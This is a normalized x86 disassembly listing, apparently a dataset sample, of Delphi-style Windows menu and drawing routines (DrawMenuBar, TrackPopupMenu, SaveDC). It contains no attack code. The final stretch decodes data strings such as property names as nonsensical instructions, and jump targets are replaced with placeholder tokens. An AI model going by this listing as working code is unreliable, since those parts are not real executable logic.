sub_44e5c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44e0bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44df44
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44e650
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44e68c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e6b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e6d8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ec0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec12
lea eax [ ebp - 0x30 ]
call sub_403e54
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ esi + 0x4 ]
call sub_44da84
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45aa80
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov dx [ esi + 0x4 ]
call sub_44da68
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ea3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ea21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41dbbc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41da5c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44eeb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ea28
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dbbc
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44e2c8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44d9c8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44d9c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44eb81
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44eb5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44eb3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41dbbc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41da5c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eb46
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dbbc
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43745c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45aa80
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44d9c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44d9c8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44d9c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44d9f8
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44d9f8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45a724
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45a78c
jmp r-xdata
sub_44eb63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44ec1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413c10
pop esi
pop ebx
retn
push ebx
push sub_44e68c
call sub_41a9a0
mov [ ebx + 0x10 ] eax
sub_44ec60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44d7e0
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44ec1c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_44ecd4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44ec44
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44d87c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_44ed2c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_449b78
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44e4e8
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e4e8
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44ed74
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_449b78
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4592d0
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403300
mov edx eax
jmp r-xdata
sub_44edc0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412910
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44ed2c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44d134
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44d630
mov eax [ ebx + 0x34 ]
call sub_44a9d8
mov eax ebx
call sub_44dfd8
mov eax ebx
call sub_44ed74
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44ab08
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44ee74
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413d6c
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413d6c
cmp ebp [ eax ]
jne r-xdata
sub_44eeb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d3f4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41cc28
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d3f4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41cc28
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403300
mov edx [ r-xdata ]
call sub_403290
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d3f4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41cc28
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44ef98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ea8
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404114
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4043b4
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404114
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4043b4
jmp r-xdata
sub_44f02c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403e54
mov ebx 0x1
mov eax esi
call sub_404114
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40403c
sub_44f090
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f0e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44ef98
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44ef98
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c40
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f0f0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_44f0f8
adc al [ eax ]
add [ eax ] al
dec esp
insb
inc esi
add [ esi * 2 + 0x6c480046 ] bl
inc esi
add [ eax + 0x44004674 ] bh
insb
inc esi
add [ eax + 0x74 ] dl
inc esi
add [ eax + 0x6c ] al
inc esi
add [ esp + esi * 2 + 0x6c3c0046 ] bl
inc esi
add [ eax + 0x78 ] ch
inc esi
add [ eax ] bh
insb
inc esi
add [ esp + esi * 2 + 0x6c340046 ] ah
inc esi
add [ esi + esi * 2 + 0x6c300046 ] cl
inc esi
add ah bl
jne r-xdata
jne r-xdata
add [ esp + ebp * 2 ] ch
inc esi
add [ eax ] dl
jns r-xdata
adc al [ eax ]
add [ eax ] al
add [ eax ] cl
jne r-xdata
add [ eax ] ch
insb
inc esi
add [ ecx + edi * 2 ] cl
inc esi
add [ esp + ebp * 2 ] ah
inc esi
add [ eax + 0x75 ] dh
inc esi
add [ eax ] ah
insb
inc esi
add [ eax + 0x1c004678 ] bh
insb
inc esi
add [ eax + 0x78 ] dh
inc esi
add [ eax ] bl
insb
inc esi
add [ eax + 0x79 ] bh
inc esi
add [ esp + ebp * 2 ] dl
inc esi
add [ eax ] bh
jns r-xdata
inc eax
add al ch
add al 0x57
sti
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_44f1f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax [ rw-data ]
call sub_403104
mov eax rw-data
mov ecx 0x12
insb
inc esi
add ah bh
add [ eax ] dl
insb
inc esi
add [ ebp + esi * 2 + 0x6c0c0046 ] al
inc esi
add [ eax + 0x8004675 ] bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f1f7
retn
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
call sub_403104
sub_44f1fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_44f0f8
call sub_403c00
mov eax [ r-xdata ]
call sub_4135a8
mov eax [ r-xdata ]
call sub_413648
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
mov eax [ r-xdata ]
call sub_4134ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242c4
mov [ rw-data ] eax
sub_44f2e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc esp
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc esp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
call [ eax ]
push ss
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
rcl [ ebx + esi * 8 + 0x44 ] 0x0
pop es
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
inc eax
push ds
inc ebp
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push [ esi + ebx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
js r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ eax + 0x1d ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
push esp
inc esp
add [ edi ] al
jae r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41aeb8
sub [ eax ] al
add bh bh
cmp al 0x1d
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc esp
add ah bl
sbb al [ ecx ]
or eax 0x6f460500
jb r-xdata
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi * 8 + 0xc030044 ] bh
push esp
nop
push ds
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
call [ eax + 0x100451e ]
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xfc004030
inc edx
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add [ eax ] bl
push ss
inc ebp
add [ ecx ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 ] bh
inc esp
add [ eax ] cl
add [ eax ] al
push 0x4c00411a
xor eax [ eax ]
pop eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x44 ] dl
jae r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x84004030
and [ ebp ] eax
inc eax
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bh
cmc
inc esp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
clc
sbb al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
dec esi
outsd
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
jo r-xdata
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
add [ eax + 0x16 ] al
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add ah dl
push ds
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
add bh bh
rcr [ esi ] 0x45
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
sbb al 0x98
inc ebx
add [ ebx + ecx * 8 ] bl
inc ebx
add [ ecx ] dh
inc ebx
add ah bl
lahf
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax ] al
je r-xdata
sbb [ eax ] ch
inc ebp
add [ eax + ebp + 0x26f00045 ] ch
inc ebp
add [ eax + 0x22 ] dl
inc ebp
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax + 0x30 ]
and al [ ebp ]
loopne r-xdata
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ ecx ] cl
inc ebp
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] bh
inc ebp
add [ eax ] dl
and al [ ebp ]
enter 0x43df 0x0
shl [ ecx ] 0x45
